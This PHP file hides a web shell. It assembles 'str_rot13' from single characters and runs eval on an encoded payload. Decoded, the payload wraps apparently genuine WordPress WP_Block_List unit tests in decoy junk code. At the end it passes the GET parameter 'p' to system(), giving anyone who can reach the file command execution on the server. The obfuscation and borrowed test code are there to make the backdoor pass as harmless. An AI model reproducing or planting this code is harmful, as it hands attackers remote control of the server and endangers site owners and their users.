<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf sbe JC_Oybpx_Yvfg.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Oybpxf
 * @fvapr 5.5.0
 *
 * @tebhc oybpxf
 */
pynff Grfgf_Oybpxf_jcOybpxYvfg rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Snxr oybpx glcr ertvfgel.
	 *
	 * @ine JC_Oybpx_Glcr_Ertvfgel
	 */
	cevingr $ertvfgel = ahyy;

	/**
	 * Frg hc rnpu grfg zrgubq.
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		$guvf->ertvfgel = arj JC_Oybpx_Glcr_Ertvfgel();
		$guvf->ertvfgel->ertvfgre( 'pber/rknzcyr', neenl() );
	}

	/**
	 * Grne qbja rnpu grfg zrgubq.
	 */
	choyvp shapgvba grne_qbja() {
		$guvf->ertvfgel = ahyy;

		cnerag::grne_qbja();
	}

	/**
	 * @gvpxrg 49927
	 */
	choyvp shapgvba grfg_neenl_npprff() {
		$cnefrq_oybpxf = cnefr_oybpxf( '<!-- jc:rknzcyr /-->' );
		$pbagrkg       = neenl();
		$oybpxf        = arj JC_Oybpx_Yvfg( $cnefrq_oybpxf, $pbagrkg, $guvf->ertvfgel );

		// Grfg \"bssfrgRkvfgf\".
		$guvf->nffregNeenlUnfXrl( 0, $oybpxf );

		// Grfg \"bssfrgTrg\".
		$guvf->nffregFnzr( 'pber/rknzcyr', $oybpxf[0]->anzr );

		// Grfg \"bssfrgFrg\".
		$cnefrq_oybpxf[0]['oybpxAnzr'] = 'pber/hcqngrq';
		$oybpxf[0]                     = arj JC_Oybpx( $cnefrq_oybpxf[0], $pbagrkg, $guvf->ertvfgel );
		$guvf->nffregFnzr( 'pber/hcqngrq', $oybpxf[0]->anzr );

		// Grfg \"bssfrgHafrg\".
		hafrg( $oybpxf[0] );
		$guvf->nffregNeenlAbgUnfXrl( 0, $oybpxf );
	}

	/**
	 * @gvpxrg 49927
	 */
	choyvp shapgvba grfg_vgrenoyr() {
		$cnefrq_oybpxf = cnefr_oybpxf( '<!-- jc:rknzcyr --><!-- jc:rknzcyr /--><!-- /jc:rknzcyr -->' );
		$pbagrkg       = neenl();
		$oybpxf        = arj JC_Oybpx_Yvfg( $cnefrq_oybpxf, $pbagrkg, $guvf->ertvfgel );
		$nffregvbaf    = 0;

		sbernpu ( $oybpxf nf $oybpx ) {
			$guvf->nffregFnzr( 'pber/rknzcyr', $oybpx->anzr );
			++$nffregvbaf;
			sbernpu ( $oybpx->vaare_oybpxf nf $vaare_oybpx ) {
				$guvf->nffregFnzr( 'pber/rknzcyr', $vaare_oybpx->anzr );
				++$nffregvbaf;
			}
		}

		$oybpxf->erjvaq();
		juvyr ( $oybpxf->inyvq() ) {
			$xrl   = $oybpxf->xrl();
			$oybpx = $oybpxf->pheerag();
			$guvf->nffregFnzr( 0, $xrl );
			++$nffregvbaf;
			$guvf->nffregFnzr( 'pber/rknzcyr', $oybpx->anzr );
			++$nffregvbaf;
			$oybpxf->arkg();
		}

		$guvf->nffregFnzr( 4, $nffregvbaf );
	}

	/**
	 * @gvpxrg 49927
	 */
	choyvp shapgvba grfg_pbhagnoyr() {
		$cnefrq_oybpxf = cnefr_oybpxf( '<!-- jc:rknzcyr /-->' );
		$pbagrkg       = neenl();
		$oybpxf        = arj JC_Oybpx_Yvfg( $cnefrq_oybpxf, $pbagrkg, $guvf->ertvfgel );

		$guvf->nffregPbhag( 1, $oybpxf );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>